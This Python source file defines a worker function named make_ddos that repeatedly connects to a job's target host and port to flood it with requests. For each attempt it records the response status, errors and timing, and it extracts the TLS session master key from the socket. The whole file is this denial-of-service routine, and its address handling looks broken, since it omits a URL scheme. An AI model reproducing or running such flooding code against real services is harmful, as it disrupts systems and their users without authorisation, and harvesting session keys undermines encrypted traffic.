import datetime
from urllib.request import urlopen
from urllib.error import HTTPError, URLError
from sslmasterkey import get_ssl_master_key


class ResponseInfo:
    def __init__(self, master_key, status, error, start_time, end_time):
        self.master_key = master_key
        self.status = status
        self.error = error
        self.start_time = start_time
        self.end_time = end_time

    def __str__(self):
        return ';'.join([self.master_key, self.status, self.error, self.start_time, self.end_time])


def make_ddos(job):
    # return 50, list(map(lambda x: str(x), range(100, 0, -1)))
    timeout = 1  # TODO: set timeout in JobInfo
    host = job.host
    port = str(job.port)
    address = ':'.join([host, port])
    n_queries = job.max_queries_per_worker
    responses = []
    successful_conn = 0
    for _ in range(n_queries):
        master_key = ''
        status = ''
        error = 'No error'
        start_time = str(datetime.datetime.now())
        try:
            with urlopen(address, timeout=timeout) as response:
                master_key = get_ssl_master_key(response.fp.raw._sock)
                status = str(response.status)
                successful_conn += 1
        except (HTTPError, URLError) as err:
            error = str(err)
        except Exception as err:
            error = str(err)
        finally:
            end_time = str(datetime.datetime.now())
            info = ResponseInfo(master_key, status, error, start_time, end_time)
            responses.append(str(info))

    return successful_conn, responses